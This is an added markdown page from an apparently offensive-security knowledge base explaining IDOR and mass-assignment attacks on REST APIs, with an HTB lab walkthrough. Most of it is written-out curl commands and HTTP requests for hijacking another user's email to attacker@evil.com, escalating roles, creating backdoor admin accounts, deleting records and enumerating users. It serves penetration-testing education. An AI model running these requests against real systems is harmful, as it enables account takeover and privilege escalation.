@@ -1,0 +1,474 @@
+---
+title: Insecure APIs
+description: REST/JSON APIs are IDOR-prone because every verb exposes a distinct attack surface - GET for reading, PUT for modifying, POST for creating, DELETE for removing. Walk through each verb's misuse pattern, the uid-mismatch / uuid-mismatch partial defenses and their bypasses, and the role-field client-trust mistake.
+mitre: [T1190, T1556]
+d3fend: [D3-IAA]
+impact: [AccountTakeover, AuthBypass, PrivilegeEscalation]
+owasp: [A01]
+sidebar:
+  order: 4
+  label: Insecure APIs
+---
+
+## TL;DR
+
+REST APIs expose richer IDOR surfaces than traditional pages. Each verb is its own attack:
+
+```
+# GET - information disclosure (most common)
+curl -b 'PHPSESSID=mine' http://target/api/profile/2
+
+# PUT - modify someone else's record
+curl -b '...' -X PUT http://target/api/profile/2 \
+     -H 'Content-Type: application/json' \
+     -d '{"uid":2, "uuid":"<their_uuid>", "email":"attacker@evil.com"}'
+
+# POST - create record on someone else's behalf, or create as elevated role
+curl -b '...' -X POST http://target/api/profile/new \
+     -d '{"role":"admin", ...}'
+
+# DELETE - remove records that belong to others
+curl -b '...' -X DELETE http://target/api/profile/2
+
+# Role manipulation - set your own role to admin if the back-end trusts the request
+curl -b '...' -X PUT http://target/api/profile/1 \
+     -d '{"uid":1, "uuid":"<my_uuid>", "role":"web_admin", ...}'
+```
+
+Success indicator: a verb-based action on a foreign or elevated-privilege resource succeeds.
+
+## Why APIs are IDOR magnets
+
+Three structural reasons:
+
+1. **Predictable URL patterns.** REST conventions push toward `/resource/<id>` paths - direct references everywhere by design.
+2. **Verb-as-action.** GET reads, PUT updates, DELETE removes. Each is a separate code path in the back-end, often with separate (and inconsistent) authorization checks.
+3. **JSON body trust.** Clients send full resource representations on PUT. Apps that don't carefully distinguish "fields the client may set" from "fields the server controls" let clients override role, uid, or other privileged attributes.
+
+Combined with the typical lack of per-resource access control, the result is that most APIs in their first version have IDOR vulnerabilities somewhere.
+
+## The verb-by-verb attack surface
+
+### GET - information disclosure
+
+The simplest case. The server serializes resource state and returns it. If access control is missing, any session reads any resource.
+
+```http
+GET /api/profile/2 HTTP/1.1
+Cookie: PHPSESSID=mine
+```
+
+Response:
+
+```json
+{
+    "uid": "2",
+    "uuid": "4a9bd19b3b8676199592a346051f950c",
+    "role": "employee",
+    "full_name": "Iona Franklyn",
+    "email": "i_franklyn@employees.htb",
+    "about": "..."
+}
+```
+
+This is the *generator* IDOR in most chains - it produces the data (uuid, role names, internal IDs) that downstream mutation calls need. Without it, PUT and DELETE typically fail on "uuid mismatch" or "invalid role" checks. With it, the chain completes.
+
+Always GET first. The disclosure leaks the values you'll need for everything else.
+
+### PUT - modify a resource
+
+PUT updates a resource. Two distinct attack patterns:
+
+**Pattern A: change another user's data.** Sometimes lets you reset their password indirectly (change their email, request password reset which now goes to attacker), or inject XSS payloads into a public profile field.
+
+```http
+PUT /api/profile/2 HTTP/1.1
+Cookie: PHPSESSID=mine
+Content-Type: application/json
+
+{
+    "uid": 2,
+    "uuid": "<their_uuid_from_GET>",
+    "role": "employee",
+    "full_name": "Iona Franklyn",
+    "email": "attacker@evil.com",       ← changed
+    "about": "..."
+}
+```
+
+If access control is missing, this succeeds. Now request a password reset for Iona - link goes to attacker@evil.com - see [Reset tokens](/codex/web/auth/reset-tokens/).
+
+**Pattern B: privilege-escalate your own account.** Set fields the server should control:
+
+```http
+PUT /api/profile/1 HTTP/1.1
+Cookie: PHPSESSID=mine
+Content-Type: application/json
+
+{
+    "uid": 1,
+    "uuid": "<my_uuid>",
+    "role": "web_admin",                 ← was "employee"
+    "full_name": "Amy Lindon",
+    ...
+}
+```
+
+The "trusting client-supplied role" mistake is depressingly common. The back-end takes the full JSON body and writes every field into the DB row.
+
+### POST - create a resource
+
+POST creates a new resource. The IDOR angles:
+
+**Create-as-anyone:** when the new-resource body accepts a `uid` or `owner_id` that designates the owner:
+
+```http
+POST /api/posts HTTP/1.1
+
+{
+    "author_uid": 99,         ← someone else
+    "content": "Attacker-crafted message in the victim's voice"
+}
+```
+
+If the server trusts `author_uid`, the post is attributed to user 99.
+
+**Create-elevated:** when the new-resource body accepts a `role` or `permissions` field:
+
+```http
+POST /api/users HTTP/1.1
+
+{
+    "username": "backdoor",
+    "password": "p",
+    "role": "admin"
+}
+```
+
+If the back-end doesn't strip privileged fields from POST bodies, the new account is admin.
+
+### DELETE - remove a resource
+
+```http
+DELETE /api/profile/2 HTTP/1.1
+Cookie: PHPSESSID=mine
+```
+
+Less common than PUT (writing modifications is more valuable than destroying records for most engagements) but worth testing. When DELETE is missing access control, the attacker can:
+
+- Delete other users' accounts (denial of service)
+- Delete records that contain audit-trail data (covering tracks)
+- Trigger orphaned-record bugs by deleting referenced resources
+
+### PATCH - partial modification
+
+PATCH is PUT's surgical cousin - it expects a subset of the resource. Same attack surface, but interesting when PUT is well-defended and PATCH isn't:
+
+```http
+PATCH /api/profile/1 HTTP/1.1
+Content-Type: application/json
+
+{"role": "admin"}
+```
+
+A single-field update. If the back-end has different authorization logic for PATCH vs PUT (depressingly common), this slips through where PUT would be blocked.
+
+## The "mismatch" defense pattern
+
+Many apps implement a *partial* access control that compares request fields against each other, but not against the caller's identity:
+
+```python
+# Pseudo-code of a common bad pattern
+def update_profile(request, profile_id):
+    body = parse_json(request.body)
+    if body['uid'] != profile_id:
+        return error("uid mismatch")
+    if body['uuid'] != db.get_profile(profile_id).uuid:
+        return error("uuid mismatch")
+    # ... write changes
+```
+
+This blocks the naive bypass:
+
+- "Set uid=99 in the body, target /api/profile/1" → uid mismatch
+- "Target /api/profile/2 but keep my uid=1 in body" → uid mismatch
+
+But it doesn't check `session.user_id == profile_id`. The check is only field-vs-field within the request itself, not session-vs-target.
+
+### Bypassing mismatch defenses
+
+The bypass is to **harvest the foreign uuid via GET** (which the mismatch defense doesn't protect), then submit a fully-consistent PUT:
+
+```shell
+# Step 1: Disclosure via GET
+$ curl -sb 'PHPSESSID=mine' http://target/api/profile/2 | jq
+{
+    "uid": "2",
+    "uuid": "4a9bd19b3b8676199592a346051f950c",
+    "role": "employee",
+    ...
+}
+
+# Step 2: PUT with consistent uid + uuid (both refer to user 2)
+$ curl -sb 'PHPSESSID=mine' -X PUT http://target/api/profile/2 \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 2,
+         "uuid": "4a9bd19b3b8676199592a346051f950c",
+         "role": "employee",
+         "email": "attacker@evil.com"
+       }'
+```
+
+The body is internally consistent (uid 2 matches uuid for user 2, and the URL path is /profile/2). The mismatch defense passes. The action runs. The email of user 2 is now attacker-controlled.
+
+The reason the bypass works is that the mismatch defense conflates two questions:
+
+- "Are the request fields consistent with each other?" (what mismatch actually checks)
+- "Is the caller authorized to modify *this resource*?" (what should be checked)
+
+Apps that ship only the first check fail open on chained-disclosure attacks.
+
+### The "invalid role" defense
+
+Similar pattern for the role field:
+
+```python
+ALLOWED_ROLES = ['employee', 'manager', 'admin', 'web_admin']
+if body['role'] not in ALLOWED_ROLES:
+    return error("Invalid role")
+```
+
+This blocks `"role": "superuser"` (not in the list) but does nothing about a regular user setting their role to `"admin"` (which is in the list). The check answers "is this a known role" without answering "is this caller allowed to assume this role."
+
+Discover the valid role names via GET disclosure (some user is an admin; their record reveals the admin role's string name), then submit a PUT setting your own role to it. See the chaining walkthrough in [Chaining](/codex/web/idor/chaining/).
+
+## Inspecting REST endpoints
+
+### Find the API surface
+
+Three discovery methods:
+
+1. **Burp's site map** - every endpoint you've hit while browsing is listed. Right-click → "Engagement tools" → "Find references."
+2. **JS bundle reading** - search the front-end source for `fetch(`, `axios`, `$.ajax`, `XMLHttpRequest`. Each call has a URL.
+3. **Common path probing** - even without leads, common API paths often exist:
+
+```
+/api/users         /api/users/<id>      /api/profile      /api/profile/<id>
+/api/admin/users   /api/v1/users        /api/v2/users     /api/me
+/api/account       /api/account/<id>    /rest/users       /graphql
+```
+
+```shell
+$ ffuf -w api-paths.txt -u 'http://target/FUZZ' \
+       -H 'Cookie: PHPSESSID=mine' -mc 200,401,403
+```
+
+`-mc 200,401,403` matches both successful and protected paths - the protected ones are interesting because they exist (just check whether you can hit them via a different verb).
+
+### Probe each verb on a found endpoint
+
+```shell
+$ for verb in GET POST PUT DELETE PATCH OPTIONS HEAD; do
+    code=$(curl -sb 'PHPSESSID=mine' -o /dev/null -w '%{http_code}' \
+           -X "$verb" "http://target/api/profile/1")
+    echo "$verb: $code"
+  done
+
+GET:     200       ← reads work
+POST:    405       ← not allowed
+PUT:     200       ← writes work - IDOR candidate
+DELETE:  405
+PATCH:   200       ← also works - try this if PUT defends
+OPTIONS: 200       ← reveals more
+HEAD:    200
+```
+
+`OPTIONS` often returns an `Allow:` header listing every accepted verb - this is the quickest discovery:
+
+```shell
+$ curl -i -X OPTIONS http://target/api/profile/1
+HTTP/1.1 200 OK
+Allow: GET, PUT, DELETE, PATCH, OPTIONS, HEAD
+```
+
+Now you know `DELETE` should work too (despite the earlier `405` - could be a different code path with different auth).
+
+### The CORS preflight tell
+
+For browser-driven non-simple requests (anything besides simple-form-encoded POST), the browser sends an `OPTIONS` preflight. If the preflight response includes:
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Credentials: true
+```
+
+The combination `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` is actually invalid per spec (browsers reject it), but apps that try this often have other CORS confusion that may let cross-origin XHR work. Not strictly an IDOR bug but adjacent - it expands the surface from "needs session" to "needs cross-origin XHR access."
+
+## Reading raw JSON for hidden fields
+
+When the API response or request body contains fields that aren't reflected in the UI, those fields might still be honored by the back-end:
+
+```json
+{
+    "uid": 1,
+    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+    "role": "employee",
+    "full_name": "Amy Lindon",
+    "email": "a_lindon@employees.htb",
+    "about": "...",
+    "is_admin": false,            ← hidden in UI but present in JSON
+    "permissions": ["read"],      ← same
+    "verified": true,
+    "balance": 1000
+}
+```
+
+Each of these is a candidate for inclusion in a PUT body:
+
+```json
+{
+    ...,
+    "is_admin": true,
+    "permissions": ["read", "write", "admin"],
+    "balance": 99999
+}
+```
+
+If the back-end uses ORM `update_from_dict()` or similar mass-assignment patterns, every field in the JSON body writes to the DB. Mass-assignment vulnerabilities are the structural reason `role`-field manipulation works in so many apps.
+
+### Discovery via diff
+
+```shell
+# Capture the response
+$ curl -sb 'PHPSESSID=mine' http://target/api/profile/1 > current.json
+
+# Submit a PUT with extra fields
+$ curl -sb '...' -X PUT http://target/api/profile/1 \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "uid": 1,
+         "uuid": "<my_uuid>",
+         "is_admin": true,
+         "balance": 99999,
+         "verified": true
+       }'
+
+# Capture again and diff
+$ curl -sb '...' http://target/api/profile/1 > after.json
+$ diff <(jq -S . current.json) <(jq -S . after.json)
+```
+
+If any of the speculative fields stuck, the mass-assignment pattern is in play. Now systematically test every plausible field name.
+
+## Common field names to probe
+
+| Field | What it controls |
+| --- | --- |
+| `role`, `roles`, `is_admin`, `is_superuser` | Privilege |
+| `permissions`, `scopes`, `acl` | Granular access |
+| `verified`, `email_verified`, `phone_verified` | Verification status |
+| `balance`, `credits`, `points`, `coins` | Virtual currency |
+| `subscription`, `plan`, `tier` | Paid feature gating |
+| `created_at`, `updated_at` | Audit trail manipulation |
+| `deleted`, `is_deleted`, `archived` | Soft-delete bypass / undelete |
+| `password`, `password_hash` | Some apps accept password updates in the profile body |
+| `email`, `email_address` | Reset-target hijack |
+| `mfa_enabled`, `2fa_enabled` | Disable MFA on someone's account |
+| `api_key`, `token` | Steal/rotate someone's API credentials |
+| `parent_id`, `owner_id` | Reparent resources |
+
+For each, the test is the same - submit a PUT including the field with a chosen value, GET the resource again, see if it took.
+
+## Verb tampering inside APIs
+
+Same pattern as in classical web apps but applied to API endpoints. When PUT is denied (`"Updating other users is for admins only"`) but POST works:
+
+```http
+POST /api/profile/2 HTTP/1.1
+X-HTTP-Method-Override: PUT
+```
+
+Or:
+
+```http
+POST /api/profile/2?_method=PUT HTTP/1.1
+```
+
+Or move the modification fields from JSON body to query string when the back-end uses `$_REQUEST`-style parameter handling:
+
+```
+POST /api/profile/2?email=attacker@evil.com&uuid=<their>&uid=2
+```
+
+See [Verb tampering](/codex/web/auth/verb-tampering/) for the catalog.
+
+## A worked walkthrough
+
+The HTB Employee Manager scenario, walked through:
+
+```shell
+# Step 1: Intercept the legit profile update for our own account
+PUT /profile/api.php/profile/1
+{"uid":1,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","email":"a_lindon@..."}
+
+# Step 2: Test changing our uid → uid mismatch
+PUT /profile/api.php/profile/1
+{"uid":2, ...}
+# Response: "uid mismatch"
+
+# Step 3: Test changing target endpoint → uuid mismatch
+PUT /profile/api.php/profile/2
+{"uid":2, "uuid":"40f5...","role":"employee", ...}    # Our uuid, but uid=2
+# Response: "uuid mismatch"
+
+# Step 4: Disclosure via GET (no mismatch defense applies)
+GET /profile/api.php/profile/2
+{"uid":"2","uuid":"4a9bd19b...","role":"employee", ...}    # Got their uuid
+
+# Step 5: Now-armed PUT with consistent uid + uuid
+PUT /profile/api.php/profile/2
+{"uid":2, "uuid":"4a9bd19b...", "role":"employee", "email":"attacker@evil.com"}
+# Response: success - user 2's email changed
+
+# Step 6: Enumerate all users to find admin role's string
+$ for i in $(seq 1 100); do curl ... http://target/api/profile/$i >> all.json; done
+$ jq 'select(.role != "employee")' all.json
+{"uid":"52","uuid":"a36fa9e66e85f2dd6f5e13cad45248ae","role":"web_admin", ...}
+
+# Step 7: Set our own role to web_admin
+PUT /profile/api.php/profile/1
+{"uid":1, "uuid":"40f5...","role":"web_admin", ...}    # role escalated
+# Refresh cookie or set Cookie: role=web_admin
+
+# Step 8: Now-admin can create users
+POST /profile/api.php/profile/new
+{"uid":101, "uuid":"...", "role":"web_admin", ...}
+```
+
+Three IDOR primitives chained:
+- GET disclosure (Step 4) → leaks uuids
+- PUT modification (Step 5) → mass enumeration of records
+- PUT role escalation (Step 7) → admin function call
+
+For the full end-to-end walkthrough, see [Chaining](/codex/web/idor/chaining/).
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Probe accepted verbs | `curl -i -X OPTIONS http://target/api/path/` |
+| GET disclosure | `curl -sb '...' http://target/api/profile/$i` |
+| PUT modification | `curl -X PUT -H 'Content-Type: application/json' -d '{...}'` |
+| POST create | `curl -X POST -d '{...}'` |
+| DELETE removal | `curl -X DELETE http://target/api/resource/$i` |
+| PATCH partial update | `curl -X PATCH -d '{"field":"value"}'` |
+| Mismatch bypass | GET to harvest uuid; PUT with consistent uid+uuid+url-path |
+| Role-name discovery | Mass GET, `jq 'select(.role != "<your_role>")'` |
+| Mass-assignment probe | Add hidden fields (`is_admin`, `balance`, etc.) to PUT body |
+| Method-override header | `-H 'X-HTTP-Method-Override: PUT'` |
+| Method-override param | `?_method=PUT` |
+| Param-source confusion | Move JSON body fields to URL query string |
+
+For the full end-to-end engagement chain, continue to [Chaining](/codex/web/idor/chaining/). For verb-tampering details, see [Verb tampering](/codex/web/auth/verb-tampering/).
